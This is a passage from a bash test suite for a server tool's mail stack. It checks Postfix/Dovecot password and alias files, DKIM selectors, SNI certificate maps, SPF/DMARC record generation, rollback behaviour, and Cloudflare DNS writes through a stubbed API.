assert_has "the credentials reach Postfix through its map" "[smtp.example.net]:2587 me@example.net:R3layS3cretPw" "$(cat "$MAIL_SASL_MAP")"
if (( CAN_CHMOD )); then assert_eq "which only root can read" "600" "$(stat -c %a "$MAIL_SASL_MAP")"; fi
assert_lacks "the state file holds no password" "R3layS3cretPw" "$(cat "$MAIL_RELAY_INFO")"
assert_has "only what is not secret" "USER=me@example.net" "$(cat "$MAIL_RELAY_INFO")"
assert_eq "a relay without a password is refused" 1 "$(printf '' | run_isolated lib_mail_relay_set smtp.example.net 587 me@example.net)"
# a user name with a space or a colon would split the entry and SASL would fail with nothing
# in the log to say why
assert_eq "a relay user with a space is refused" 1 "$(printf 'x\n' | run_isolated lib_mail_relay_set smtp.example.net 587 'me@example.net extra')"

# A rollback has to put the whole stack back, not the two services the apply happens to reach
# last: the apply stops at the FIRST failure, so the ones already restarted are the ones left
# running on files that have just been taken away from them.
_rb="$(declare -f _mail_apply_rollback)"
assert_has "the rollback restarts every mail service" "lib_mail_services" "$_rb"
assert_has "after telling systemd the unit files changed" "daemon-reload" "$_rb"
assert_has "and says which ones did not come back" "did not come back" "$_rb"
_ap="$(declare -f lib_mail_apply)"
assert_has "an apply that ends the run outright still restores" 'lib_rollback_push "lib_mail_restore_snapshot"' "$_ap"
assert_has "and the step is dropped once it succeeds" 'lib_rollback_drop "lib_mail_restore_snapshot"' "$_ap"
# the jail file is one of the managed files, so every path that writes it puts it into effect
assert_has "a changed jail file reaches fail2ban" "fail2ban-client reload" "$_ap"
assert_eq "and so is one with an invalid host" 1 "$(printf 'x\n' | run_isolated lib_mail_relay_set 'not a host' 587 me@example.net)"

# The stack can be dead for weeks without a word unless doctor knows about it.
_dm="$(declare -f _doc_check_mail)"
assert_true  "doctor has a mail section"            test -n "$_dm"
assert_has   "which runs only where mail exists"    "lib_mail_installed" "$_dm"
assert_has   "and checks every mail service"        "lib_mail_services" "$_dm"
assert_has   "that the Linux logins stay switched off" "auth-system" "$_dm"
assert_has   "the filter socket nobody else may open"  "MAIL_MILTER_GROUP" "$_dm"
assert_has   "and the certificate running out"      "lib_ssl_days_left" "$_dm"
assert_has   "doctor runs it"                       "_doc_check_mail" "$(declare -f lib_doctor_run)"

# =============================================================================
section "a domain of its own: mailboxes, aliases, DKIM"
# Two domains with mail and one without, so every renderer has to filter.
_m_state="$TMP/state/domains"
mkdir -p "$_m_state/alpha.example" "$_m_state/beta.example" "$_m_state/plain.example"
printf '{"domain":"alpha.example","mail":{"enabled":true,"selector":"lomp202609","quota_default":"2G"}}\n' >"$_m_state/alpha.example/domain.json"
printf '{"domain":"beta.example","mail":{"enabled":true,"selector":"lomp202510"}}\n' >"$_m_state/beta.example/domain.json"
printf '{"domain":"plain.example"}\n' >"$_m_state/plain.example/domain.json"
MAIL_PASSWD_FILE="$TMP/mail-passwd"
MAIL_ALIAS_DIR="$TMP/mail-aliases"; mkdir -p "$MAIL_ALIAS_DIR"
MAIL_DKIM_DIR="$TMP/dkim"; mkdir -p "$MAIL_DKIM_DIR"
MAIL_POSTFIX_DIR="$TMP/pf2"; MAIL_SNI_MAP="$TMP/pf2/sni"; mkdir -p "$MAIL_POSTFIX_DIR"
printf 'key\n' >"${MAIL_DKIM_DIR}/alpha.example.lomp202609.key"
printf 'key\n' >"${MAIL_DKIM_DIR}/beta.example.lomp202510.key"

assert_eq "only the domains whose mail is on" "alpha.example beta.example" "$(lib_mail_domains | tr '\n' ' ' | sed 's/ $//')"
assert_eq "each with the selector it was signed with" "lomp202510" "$(lib_mail_selector beta.example)"
assert_has "and a dated one where there is none yet" "lomp" "$(lib_mail_selector plain.example)"

lib_mail_passwd_set "info@alpha.example" '{BLF-CRYPT}$2y$05$abcdefghijklmnopqrstuv' "2G"
lib_mail_passwd_set "sales@alpha.example" '{BLF-CRYPT}$2y$05$second' "500M"
lib_mail_passwd_set "info@beta.example" '{BLF-CRYPT}$2y$05$third' "1G"
_pw="$(cat "$MAIL_PASSWD_FILE")"
# Dovecot keeps the FIRST line for a user and a line with too few fields authenticates but
# has no mailbox, so the shape is the whole point
assert_has "the line carries the hash and the quota" 'info@alpha.example:{BLF-CRYPT}$2y$05$abcdefghijklmnopqrstuv::::::userdb_quota_rule=*:storage=2G' "$_pw"
# fewer than eight fields authenticates but has no mailbox behind it
assert_true "with the eight fields Dovecot wants" bash -c "(( \$(awk -F: 'NR==1{print NF}' '$MAIL_PASSWD_FILE') >= 8 ))"
lib_mail_passwd_set "info@alpha.example" '{BLF-CRYPT}$2y$05$changed' "3G"
assert_eq  "a second password replaces the line, never adds one" 1 "$(grep -c '^info@alpha.example:' "$MAIL_PASSWD_FILE")"
assert_has "and the new one is what is left" '$2y$05$changed' "$(cat "$MAIL_PASSWD_FILE")"
assert_eq  "the quota comes back out" "3G" "$(lib_mail_box_quota info@alpha.example)"
assert_eq  "mailboxes of one domain" "info@alpha.example sales@alpha.example" "$(lib_mail_boxes alpha.example | sort | tr '\n' ' ' | sed 's/ $//')"

lib_mail_alias_set alpha.example "postmaster@alpha.example" "info@alpha.example"
lib_mail_alias_set alpha.example "team@alpha.example" "info@alpha.example,sales@alpha.example"
lib_mail_alias_set alpha.example "old@alpha.example" "somebody@outside.example"

_vd="$(lib_mail_render_vdomains)"
assert_has "a domain with mail is virtual" $'alpha.example\tvirtual' "$_vd"
assert_lacks "a site without mail is not" "plain.example" "$_vd"
_vm="$(lib_mail_render_vmailbox)"
assert_has "every mailbox is listed" $'info@alpha.example\talpha.example/info/Maildir/' "$_vm"
_va="$(lib_mail_render_valias)"
assert_has "aliases go in as written" $'team@alpha.example\tinfo@alpha.example,sales@alpha.example' "$_va"

_sn="$(lib_mail_render_senders)"
# postmap keeps the FIRST of two lines with the same key and only warns, so an address that is
# both a mailbox and an alias target must arrive on ONE line with both owners
assert_eq  "one line per address, never two" 1 "$(grep -c '^info@alpha.example' <<<"$_sn")"
assert_has "a mailbox may send as itself" $'info@alpha.example\tinfo@alpha.example' "$_sn"
assert_has "an alias may be used by everyone it points at" $'team@alpha.example\tinfo@alpha.example,sales@alpha.example' "$_sn"
assert_has "including postmaster" $'postmaster@alpha.example\tinfo@alpha.example' "$_sn"
assert_lacks "an alias that only goes outside gives nobody the right to send as it" "old@alpha.example" "$_sn"
# ...and it must not decide the exit status either. The renderer's loops end on the test that
# asks whether a target is local; with the last alias of the last domain pointing outside -
# "info@ goes to my Gmail", the most ordinary alias there is - that test is the last command
# of the brace group feeding the pipe, so under pipefail the whole write failed and took
# "mail enable" down with it. old@alpha.example above is exactly that alias.
( set -o pipefail; lib_mail_render_senders >/dev/null ); _sn_rc=$?
assert_eq "the renderer still succeeds" 0 "$_sn_rc"
( set -o pipefail; lib_mail_render_senders | cat >/dev/null ); _sn_rc=$?
assert_eq "and so does the pipeline that writes it" 0 "$_sn_rc"

# the certificate blocks only exist for names whose certificate is really on disk: a block
# pointing at a missing file is a silent failure Dovecot never reports
mkdir -p "${SSL_DEPLOY_DIR}/_mail_alpha_example"
printf 'x\n' >"${SSL_DEPLOY_DIR}/_mail_alpha_example/privkey.pem"
printf 'x\n' >"${SSL_DEPLOY_DIR}/_mail_alpha_example/fullchain.pem"
_sni="$(lib_mail_render_sni)"
assert_has "the private key is named first, or the handshake dies" $'mail.alpha.example\t'"${SSL_DEPLOY_DIR}/_mail_alpha_example/privkey.pem, ${SSL_DEPLOY_DIR}/_mail_alpha_example/fullchain.pem" "$_sni"
assert_lacks "a name with no certificate yet gets no line" "mail.beta.example" "$_sni"
_dsni="$(lib_mail_render_dovecot_sni)"
assert_has "Dovecot gets the same name" 'local_name "mail.alpha.example" {' "$_dsni"
assert_has "with the chain" "ssl_cert = <${SSL_DEPLOY_DIR}/_mail_alpha_example/fullchain.pem" "$_dsni"
assert_lacks "and nothing for a name without one" "mail.beta.example" "$_dsni"
assert_eq "the brace is the last thing on its line, or Dovecot refuses the file" 0 \
  "$(grep -c '{.*[^[:space:]]' <<<"$_dsni" || true)"

_sel="$(lib_mail_render_selectors)"
assert_has "a domain with a key gets a selector line" "alpha.example lomp202609" "$_sel"
rm -f "${MAIL_DKIM_DIR}/beta.example.lomp202510.key"
assert_lacks "one without a key does not" "beta.example" "$(lib_mail_render_selectors)"

# A password that cannot be hashed safely must be refused before it reaches doveadm: doveadm
# reads the password twice from stdin and, when the two reads differ, hashes the EMPTY
# password with a zero exit status.
assert_eq "an empty password is refused"        1 "$(run_isolated lib_mail_hash_password "")"
assert_eq "a short one is refused"              1 "$(run_isolated lib_mail_hash_password "abc")"
assert_eq "one with a line break is refused"    1 "$(run_isolated lib_mail_hash_password "$(printf 'a\nb')")"
assert_eq "one with a carriage return too"      1 "$(run_isolated lib_mail_hash_password "$(printf 'goodpassword\r')")"
assert_eq "and one past bcrypt's 72 bytes"      1 "$(run_isolated lib_mail_hash_password "$(printf 'a%.0s' {1..80})")"
_hp="$(declare -f lib_mail_hash_password)"
assert_has "the password is fed to doveadm twice" '%s\n%s\n' "$_hp"
# It used to hand the fresh hash back to "doveadm pw -t <hash>" to check it. That put the
# stored hash of a mailbox into the argument list of a root process, and /proc/<pid>/cmdline
# is world-readable on a machine whose every site is a Linux user - the exact leak the 0640
# mode of the password file exists to prevent. The shape of the hash is checked instead, and
# the password itself is put to Dovecot after the line is written, with only the address on
# the command line.
assert_lacks "the new hash is never an argument either" "doveadm pw -t" "$_hp"
assert_has   "a whole bcrypt hash is what comes back"   'BLF-CRYPT' "$_hp"
assert_has   "salt and digest, to their full length"    '{53}' "$_hp"
_pv="$(declare -f lib_mail_password_verify)"
assert_has "the check that replaces it asks Dovecot" "doveadm auth test" "$_pv"
assert_lacks "with no password on the command line"  '"$pw"' "$_pv"
_pc="$(declare -f _mail_pw_confirm)"
assert_has "and reads the password from a file, on stdin" 'lib_mail_password_verify "$a" < "$MAIL_PW_FILE"' "$_pc"
assert_has "which is removed either way"                  "_mail_pw_drop" "$_pc"
_ap="$(declare -f _mail_ask_password)"
assert_has "the file is 0600 from the moment it exists"   "chmod 0600" "$_ap"
assert_has "and goes on the cleanup list, for an interrupt" "LIB_EXTRA_CLEANUP" "$_ap"
_br="$(declare -f lib_mail_box_remove)"
assert_has "removing a mailbox takes the line away first" "awk -F: -v u=" "$_br"
assert_has "then waits for Dovecot to notice" "sleep 1" "$_br"
assert_has "then closes what is still open" "doveadm kick" "$_br"

_dns="$(_mail_dns_records alpha.example)"
assert_has "the mail name"        $'A\tmail.alpha.example' "$_dns"
assert_has "the MX record"        $'MX\talpha.example\t10 mail.alpha.example.' "$_dns"
assert_has "one SPF record"       "v=spf1 ip4:" "$_dns"
assert_has "the DKIM name"        "lomp202609._domainkey.alpha.example" "$_dns"
assert_has "a DMARC record that starts gently" "v=DMARC1; p=none;" "$_dns"
assert_has "and says what must never be proxied" "DNS only" "$_dns"
assert_eq  "every row has four fields" 0 "$(awk -F'\t' 'NF != 4' <<<"$_dns" | wc -l | tr -d ' ')"
assert_true "the JSON says the same" bash -c "jq -e '.records | length >= 5' <<<'$(lib_mail_dns_json alpha.example)' >/dev/null"
# the public half is read from the private key: generating it again would replace a key whose
# public half is already published, and every signature after that would fail
assert_has "the DKIM record comes from the key on disk" "openssl rsa" "$(declare -f lib_mail_dkim_public)"
assert_has "and a key is never overwritten" '[[ -s "$key" ]] && return 0' "$(declare -f lib_mail_dkim_ensure)"

# A mailbox line is a login that works from anywhere; the flag in domain.json is not what
# keeps anyone out. So what a removal takes away follows what is on disk.
MAIL_DISABLED_DIR="$TMP/mail-disabled"
assert_true  "a domain with mailboxes has traces" lib_mail_domain_has_traces alpha.example
assert_false "one that never had mail has none"   lib_mail_domain_has_traces nothing.example
_dis="$(declare -f lib_mail_disable_main)"
assert_has "turning mail off puts the logins beyond use" "lib_mail_boxes_park" "$_dis"
assert_has "and takes the certificate cron with it"      'lib_cron_remove "mail-cert:' "$_dis"
assert_has "the removal follows the traces, not the flag" "lib_mail_domain_has_traces" "$(declare -f lib_domain_remove_main)"
# parked lines keep their hash, so enabling the domain again asks nobody for a new password
lib_mail_boxes_park alpha.example
assert_false "a parked mailbox is out of the live store" lib_mail_box_exists "sales@alpha.example"
assert_true  "but it is not lost"                        test -s "${MAIL_DISABLED_DIR}/alpha.example.passwd"
lib_mail_boxes_unpark alpha.example
assert_true  "and comes back with the hash it had"       lib_mail_box_exists "sales@alpha.example"
assert_eq    "and its quota"                             "500M" "$(lib_mail_box_quota sales@alpha.example)"

# Removing the domain has to take the parked file too. It is not in the password file, so the
# loop over the live mailboxes never sees it - and it holds every hash the domain ever had,
# which "mail enable" merges straight back in. Hosting the same name for somebody else later
# would otherwise come up with the previous owner's logins working.
lib_mail_boxes_park alpha.example
assert_true  "a parked file is a trace of its own"   test -s "${MAIL_DISABLED_DIR}/alpha.example.passwd"
assert_true  "so a removal still runs for it"        lib_mail_domain_has_traces alpha.example
lib_mail_domain_purge alpha.example
assert_false "and the parked hashes go with the domain" test -s "${MAIL_DISABLED_DIR}/alpha.example.passwd"
assert_false "nothing of it is left"                    lib_mail_domain_has_traces alpha.example
assert_has  "the purge names the parked file"           'MAIL_DISABLED_DIR' "$(declare -f lib_mail_domain_purge)"

# The flag in domain.json goes down AFTER the logins are gone, not before: an interrupt in
# between used to leave a domain the state called off whose mailboxes still answered, and the
# guard at the top then refused to finish the job for good.
_dis_body="$(sed -n '/^lib_mail_disable_main()/,/^}/p' "$ROOT/lib/mail.sh")"
_dis_park_ln="$(grep -n 'lib_mail_boxes_park' <<<"$_dis_body" | head -1 | cut -d: -f1)"
_dis_flag_ln="$(grep -n 'mail.enabled = false' <<<"$_dis_body" | head -1 | cut -d: -f1)"
assert_true "the mailboxes are put aside before the flag is written" \
  test "${_dis_park_ln:-0}" -lt "${_dis_flag_ln:-0}"
assert_has "and 'already off' is only believed when the server agrees" 'lib_mail_boxes "$d"' "$_dis"
# a restore is authoritative about which mailboxes a domain has
_rs="$(declare -f lib_mail_restore_domain)"
assert_has "a restore clears the live lines first" "_mail_lines_drop" "$_rs"
assert_has "an archive taken with mail off goes back as it lies" 'form" == "plain"' "$_rs"
_bk="$(declare -f lib_mail_backup_domain)"
assert_has "and is taken that way in the first place" 'form="plain"' "$_bk"
assert_has "because doveadm has no user to copy through" 'parked > 0' "$_bk"
assert_has "the archive says which of the two it holds" "maildirs:" "$_bk"
_ld="$(declare -f _mail_lines_drop)"
assert_lacks "dropping the lines never touches the mail" "MAIL_VMAIL_HOME" "$_ld"

# an address is either a mailbox or an alias: Postfix resolves the alias first, so a mailbox
# of the same name would never see a message
_ba="$(declare -f lib_mail_box_add_main)"
assert_has "a mailbox may not be created over an alias" "is already an alias" "$_ba"
_bd="$(declare -f lib_mail_box_del_main)"
# in every domain's alias file, not only its own: sales@one.example may forward to
# info@two.example, and deleting that mailbox used to leave the alias accepting and bouncing
assert_has "deleting a mailbox repairs the aliases that pointed at it" "lib_mail_alias_forget_everywhere" "$_bd"
assert_has "wherever they live" 'MAIL_ALIAS_DIR' "$(declare -f lib_mail_alias_forget_everywhere)"
# turning a domain off deletes nothing, so those aliases are reported rather than removed
assert_has "and turning a domain off says which ones will bounce" "_mail_alias_targets_elsewhere" "$(declare -f lib_mail_disable_main)"
lib_mail_alias_set alpha.example "team@alpha.example" "info@alpha.example,sales@alpha.example"
lib_mail_alias_forget_target alpha.example "sales@alpha.example"
assert_has   "the target is taken out"     $'team@alpha.example\tinfo@alpha.example' "$(cat "$(lib_mail_alias_file alpha.example)")"
lib_mail_alias_forget_target alpha.example "info@alpha.example"
assert_lacks "and an alias with nowhere to go is removed" "team@alpha.example" "$(cat "$(lib_mail_alias_file alpha.example)")"

# the local part may not carry the recipient delimiter, or user+tag would stop reaching user
assert_false "no plus in a mailbox name"  lib_mail_local_valid "info+news"
assert_true  "the rest still passes"      lib_mail_local_valid "first.last-2"
# an address is compared, not matched: a dot is a dot
lib_mail_passwd_set "johnxdoe@alpha.example" '{BLF-CRYPT}$2y$05$x' "1G"
assert_false "a dot in an address is not a wildcard" lib_mail_box_exists "john.doe@alpha.example"

# the reason a password was refused has to survive the call that refused it
_ap="$(declare -f _mail_ask_password)"
assert_has "the password is read in this shell, not a subshell" "lib_mail_read_password >" "$_ap"
assert_has "and so is the hashing"                              "lib_mail_hash_password " "$_ap"

# a private address in an A or SPF record is a mail server nobody can deliver to
SYS_PUBLIC_IPV4="10.0.0.5"
assert_lacks "a NAT address is never printed as the server's" "10.0.0.5" "$(_mail_dns_records alpha.example)"
SYS_PUBLIC_IPV4="203.0.113.9"
assert_has   "a real one is" "203.0.113.9" "$(_mail_dns_records alpha.example)"
# where a relay carries the mail, its senders belong in SPF too
MAIL_RELAY_INFO="$TMP/mail-relay.info"
printf 'HOST=smtp.provider.example\nPORT=587\nUSER=u\nSPF_INCLUDE=spf.provider.example\n' >"$MAIL_RELAY_INFO"
assert_has "the relay is included in SPF" "include:spf.provider.example" "$(_mail_dns_records alpha.example)"
# ...and only the include the operator gave. It used to be guessed by dropping the first label
# of the relay's host name, which turns email-smtp.eu-west-1.amazonaws.com into
# eu-west-1.amazonaws.com - a name with no SPF record. An include whose target has no record is
# a permerror for the WHOLE record, so the guess threw away the ip4: term that would have
# passed and every message the domain sent failed SPF everywhere. "--host sendgrid.net" gave
# "include:net".
printf 'HOST=email-smtp.eu-west-1.amazonaws.com\nPORT=587\nUSER=u\n' >"$MAIL_RELAY_INFO"
_spfrec="$(_mail_dns_records alpha.example)"
assert_lacks "an unknown relay is never guessed at" "include:eu-west-1.amazonaws.com" "$_spfrec"
assert_lacks "nor any other include"                "include:" "$_spfrec"
assert_has   "the record still names this server"   "v=spf1 ip4:203.0.113.9 ~all" "$_spfrec"
printf 'HOST=sendgrid.net\nPORT=587\nUSER=u\n' >"$MAIL_RELAY_INFO"
assert_lacks "and a two-label host does not become include:net" "include:net" "$(_mail_dns_records alpha.example)"
rm -f "$MAIL_RELAY_INFO"

MAIL_PASSWD_FILE="$TMP/passwd"; MAIL_ALIAS_DIR="$TMP/aliases"; MAIL_DKIM_DIR="$TMP/dkim-unused"
rm -rf "$_m_state/alpha.example" "$_m_state/beta.example" "$_m_state/plain.example"

# =============================================================================
section "names, keys and aliases that outlive what made them"
# A selector that has been in DNS must never be handed to a second key: its record is gone but
# resolvers hold what they cached, and a signature under a known name made with a different key
# is one they refuse. The list of used names never got the FIRST one - the one every domain has.
assert_has "enabling a domain remembers the selector it starts with" "selectors_used" "$(declare -f lib_mail_enable_main)"
assert_has "and refuses to reuse one if the keys were deleted"       "_mail_selector_next" "$(declare -f lib_mail_enable_main)"
# ...which is why deleting the data has to drop the name as well, and keep the list
_pg2="$(declare -f lib_mail_domain_purge)"
assert_has   "deleting the data drops the selector"  "del(.mail.selector)" "$_pg2"
assert_lacks "but never the list of used names"      "del(.mail.selectors_used)" "$_pg2"
# a rotation that was under way when mail went off has to go on when it comes back
assert_has "enabling a domain again finishes an interrupted rotation" 'lib_cron_set "mail-dkim:' "$(declare -f lib_mail_enable_main)"
# running the same enable twice must not be a failure half-way through
assert_has "an existing mailbox is not an error on a second run" "is already there" "$(declare -f lib_mail_enable_main)"

# The signing keys used to live under /var/lib/rspamd, a directory the _rspamd user owns -
# and rspamd is the one component here that parses mail an attacker wrote. A symbolic link put
# there would have been followed by root's chmod, chown and every key written afterwards.
assert_lacks "the keys are not under rspamd's own directory" "/var/lib/rspamd/dkim" "$MAIL_DKIM_DIR"
_de="$(declare -f lib_mail_dirs_ensure)"
assert_has "and a link where they go is refused, not repaired" 'is a symbolic link' "$_de"
assert_has "an older server's keys are moved across"           "_mail_dkim_dir_migrate" "$_de"
assert_has "only the ones not there already"                   '[[ -e "${MAIL_DKIM_DIR}/${b}" ]] && continue' "$(declare -f _mail_dkim_dir_migrate)"

# =============================================================================
section "the check has to agree with the writing"
# Two A records at a mail name send about half of all inbound SMTP to whichever address is
# wrong. The writing side calls that a conflict and refuses; the check called it "ok", because
# it only asked whether the right address appeared somewhere in the answer - which also said
# yes to 85.9.13.2 when the server is 5.9.13.2.
# Asked of the function itself, with DNS answering whatever the case under test needs.
_dnsq_answer=""
eval 'dig() { printf "%s" "$_dig_out"; }'
eval '_mail_dns_query() {
  case "$1 $2" in
    "A mail.alpha.example") printf "%s" "$_dnsq_a" ;;
    "MX alpha.example")     printf "10 mail.alpha.example.\n" ;;
    TXT*)                   printf "%s" "$_dnsq_txt" ;;
    *)                      printf "" ;;
  esac
}'
SYS_PUBLIC_IPV4="203.0.113.9"
_dnsq_txt=""
_dnsq_a="203.0.113.9"
_out_one="$(lib_mail_dns_check alpha.example 2>&1 || true)"
_dnsq_a=$'203.0.113.9\n198.51.100.7'
_out_two="$(lib_mail_dns_check alpha.example 2>&1 || true)"
_dnsq_a="85.9.13.2"; SYS_PUBLIC_IPV4="5.9.13.2"
_out_sub="$(lib_mail_dns_check alpha.example 2>&1 || true)"
assert_lacks "one right address draws no complaint"          "mail.alpha.example" "$(grep -E 'more than one|says:' <<<"$_out_one" || true)"
assert_has   "a second address at a mail name is reported"   "answers more than one address" "$_out_two"
assert_has   "an address that merely contains the right one is reported too" "says: 85.9.13.2" "$_out_sub"
unset -f dig _mail_dns_query
SYS_PUBLIC_IPV4="203.0.113.9"

# =============================================================================
section "records lompstack wrote, and can still take back"
# What lompstack published is worked out from the state, so anything removed from the state
# first can never be named again. Both of these used to leave a record in the zone for good.
_wd="$(declare -f lib_webmail_domain_disable)"
_wd_rec_ln="$(grep -n '_wm_dns_record_remove' <<<"$_wd" | head -1 | cut -d: -f1)"
_wd_flag_ln="$(grep -n 'del(.mail.webmail)' <<<"$_wd" | head -1 | cut -d: -f1)"
assert_true "webmail.<domain> is removed before the flag that names it" \
  test "${_wd_rec_ln:-0}" -lt "${_wd_flag_ln:-0}"
_rt="$(declare -f lib_mail_dkim_retire_old)"
_rt_rec_ln="$(grep -n '_mail_dkim_dns_remove' <<<"$_rt" | head -1 | cut -d: -f1)"
_rt_st_ln="$(grep -n 'del(.mail.selector_old)' <<<"$_rt" | head -1 | cut -d: -f1)"
assert_true "and a retired DKIM record before the selector that names it" \
  test "${_rt_rec_ln:-0}" -lt "${_rt_st_ln:-0}"
assert_has "a rotation given up takes its record with it" "_mail_dkim_dns_remove" "$(declare -f _mail_dkim_cmd)"
# and only ever lompstack's own records: somebody may be pointing that name somewhere on purpose
for _fn in _wm_dns_record_remove _mail_dkim_dns_remove; do
  assert_has "${_fn} removes only what lompstack wrote" 'CF_RECORD_TAG' "$(declare -f "$_fn")"
  assert_has "${_fn} says so when the zone cannot be read" "still published" "$(declare -f "$_fn")"
done
# a zone that cannot be looked up is not a zone with nothing in it
assert_has "the cleanup says when it removed nothing" "are still published" "$(declare -f lib_mail_dns_cleanup)"
# --replace-mx writes records and deletes another provider's MX, so it takes the lock like --apply
assert_has "--replace-mx takes the global lock too" '*" --replace-mx "*' "$(sed -n '/^  case "\$cmd" in/,/^  esac/p' "$ROOT/setup.sh")"
# changing the relay changes every domain's SPF record, and nothing here writes DNS by itself
for _fn in lib_mail_relay_set lib_mail_relay_off; do
  assert_has "${_fn} says which domains need their records again" "_mail_relay_dns_note" "$(declare -f "$_fn")"
done
# and the credentials outlive a failed apply, or Postfix comes back naming a file that is gone
_ro="$(declare -f lib_mail_relay_off)"
_ro_apply_ln="$(grep -n 'lib_mail_apply' <<<"$_ro" | head -1 | cut -d: -f1)"
_ro_sasl_ln="$(grep -n 'lib_rm "\$MAIL_SASL_MAP"' <<<"$_ro" | head -1 | cut -d: -f1)"
assert_true "the credential map is removed only after the apply succeeded" \
  test "${_ro_apply_ln:-0}" -lt "${_ro_sasl_ln:-0}"

# =============================================================================
section "what an older server is missing, and what notices"
# A webmail's virtual host names its certificate only if the files were there when it was
# written. One switched on before its name resolved here got none, and the six-hourly job that
# finally obtained the certificate rewrote Postfix's and Dovecot's tables but not that file -
# so the browser got the listener's own certificate for the life of the certificate, while
# status and doctor, which look at the certificate and not at the virtual host, said "fine".
_ce="$(declare -f lib_mail_domain_cert_ensure)"
assert_eq  "the virtual host is rewritten on both paths to a certificate" 2 "$(grep -c '_mail_webmail_vhost_refresh' <<<"$_ce")"
_vr="$(declare -f _mail_webmail_vhost_refresh)"
assert_has "only where there is a webmail" ".mail.webmail" "$_vr"
assert_has "and it writes the virtual host"  "lib_webmail_vhost_apply" "$_vr"

# The webmail sends through 127.0.0.1:10587 and saves its filters over 4190. Both came with the
# webmail; a server installed before it and then self-updated still has the older release's
# master.cf and Dovecot configuration, because self-update reconfigures nothing on purpose.
# Switching a webmail on there gave one that read mail and could not send a single message.
_sc="$(declare -f _wm_mail_stack_current)"
assert_has "the webmail checks the server can carry it" "10587" "$_sc"
assert_has "filters too"                                "managesieve-login" "$_sc"
assert_has "and brings the configuration up to date"    "lib_mail_apply" "$_sc"
assert_has "before anything else is done for the domain" "_wm_mail_stack_current" "$(declare -f lib_webmail_domain_enable)"
# and doctor says so on a server nobody switches a webmail on again
assert_has "doctor fails when the ports a webmail needs answer nobody" \
  'there is a webmail but nothing listens on' "$(declare -f _doc_check_mail)"

# The certbot deploy hook was only ever written by the installer. After a self-update the old
# copy stayed: it reloads Postfix and Dovecot but does not restart OpenLiteSpeed, which holds
# the certificate it started with - so browsers were handed the expired one from day 90 while
# doctor read the deployed files and called it healthy.
assert_has "applying the mail configuration rewrites the deploy hook" "lib_ssl_hook_install" "$(declare -f lib_mail_apply)"
assert_has "and doctor knows an older hook when it sees one" '_wm_' "$(declare -f _doc_check_ssl_infra)"

# =============================================================================
section "every mail command is in 'mail help'"
# Four subcommands were added over three phases and none of them reached the help text, so
# "lomp mail" told an operator about eleven of the fifteen commands it actually has. The help
# is the only place these are written down, which makes an undocumented command an invisible
# one.
_mail_case="$(awk '/^lib_mail_main\(\)/{f=1} f{print} f && /^[}]/{exit}' "$ROOT/lib/mail.sh")"
_mail_subs="$(grep -oE '^[[:space:]]+[a-z]+(\|[a-z]+)*\)' <<<"$_mail_case" | tr -d ' )' | cut -d'|' -f1 | grep -vE '^(\*|help|--help|-h)$' | sort -u | tr '\n' ' ')"
_mail_help="$(lib_mail_usage)"
assert_true "the mail dispatcher was found" test -n "$_mail_subs"
for _sub in $_mail_subs; do
  assert_true "'mail ${_sub}' is documented" grep -qE "^  ${_sub}( |$)" <<<"$_mail_help"
done
# and the ones this release added, by name, so a renamed command is caught too
assert_has "webmail on|off|status"  "webmail on|off|status <domain>" "$_mail_help"
assert_has "dkim rotate"            "dkim rotate <domain>" "$_mail_help"
assert_has "backup and restore"     "restore <domain> [--file ARCHIVE]" "$_mail_help"

# =============================================================================
section "writing the records into Cloudflare"
# Every API call goes through _cf_api, so the whole of this can be exercised without an
# account: the stub answers like Cloudflare and records what it was asked to do.
CF_CALLS="$TMP/cf-calls.txt"
CF_ZONE_CACHE=()
: >"$CF_CALLS"
_cf_api_real="$(declare -f _cf_api)"   # put back afterwards: later sections use the real one
_cf_zone_json='{"success":true,"result":[{"id":"zone123"}]}'
eval '_cf_api() {
  printf "%s %s\n" "$1" "$2" >>"$CF_CALLS"
  case "$1 $2" in
    "GET /zones?name=alpha.example"*)      printf "%s" "$_cf_zone_json" ;;
    "GET /zones?name="*)                   printf "%s" "{\"success\":true,\"result\":[]}" ;;
    "GET /zones/zone123/dns_records?type=A&name=mail.alpha.example"*) printf "%s" "$_cf_a_json" ;;
    "GET /zones/zone123/dns_records?type=MX"*)  printf "%s" "$_cf_mx_json" ;;
    "GET /zones/zone123/dns_records?type=TXT&name=alpha.example"*) printf "%s" "$_cf_spf_json" ;;
    "GET /zones/zone123/dns_records?type=TXT"*) printf "%s" "{\"success\":true,\"result\":[]}" ;;
    "POST "*|"PUT "*|"DELETE "*)           printf "%s" "{\"success\":true,\"result\":{\"id\":\"rec1\"}}" ;;
    *) printf "%s" "{\"success\":true,\"result\":[]}" ;;
  esac
}'
_cf_a_json='{"success":true,"result":[]}'
_cf_mx_json='{"success":true,"result":[]}'
_cf_spf_json='{"success":true,"result":[]}'

# the zone of a name is found by walking up its labels
assert_eq "the zone of a mail name" "zone123" "$(lib_cf_zone_id mail.alpha.example)"
assert_has "which is asked for by name" "GET /zones?name=mail.alpha.example" "$(cat "$CF_CALLS")"
assert_has "and then for the domain above it" "GET /zones?name=alpha.example" "$(cat "$CF_CALLS")"
CF_ZONE_CACHE=()
assert_eq "a name in no zone this token can see is refused" 1 "$(run_isolated lib_cf_zone_id mail.nowhere.example)"

# A record: created when missing, left alone when already right, refused when it points
# somewhere else and lompstack did not write it
: >"$CF_CALLS"
MAIL_DNS_APPLIED=0; MAIL_DNS_CONFLICTS=0
_mail_dns_apply_one zone123 A mail.alpha.example 203.0.113.9 >/dev/null
assert_has "a missing record is created" "POST /zones/zone123/dns_records" "$(cat "$CF_CALLS")"
assert_eq  "and counted"  1 "$MAIL_DNS_APPLIED"
_cf_a_json='{"success":true,"result":[{"id":"r1","content":"203.0.113.9","proxied":false,"comment":"lompstack:mail"}]}'
: >"$CF_CALLS"; MAIL_DNS_APPLIED=0
_mail_dns_apply_one zone123 A mail.alpha.example 203.0.113.9 >/dev/null
assert_lacks "a record that already says it is left alone" "POST" "$(cat "$CF_CALLS")"
assert_eq    "and nothing is counted as written" 0 "$MAIL_DNS_APPLIED"
_cf_a_json='{"success":true,"result":[{"id":"r1","content":"198.51.100.7","proxied":true,"comment":""}]}'
MAIL_DNS_CONFLICTS=0
_mail_dns_apply_one zone123 A mail.alpha.example 203.0.113.9 >/dev/null || true
assert_eq "somebody else's record is never overwritten" 1 "$MAIL_DNS_CONFLICTS"

# MX: another provider's mail server is a decision, not a leftover
_cf_mx_json='{"success":true,"result":[{"id":"m1","content":"aspmx.l.google.com","priority":1,"comment":""}]}'
MAIL_DNS_CONFLICTS=0; : >"$CF_CALLS"
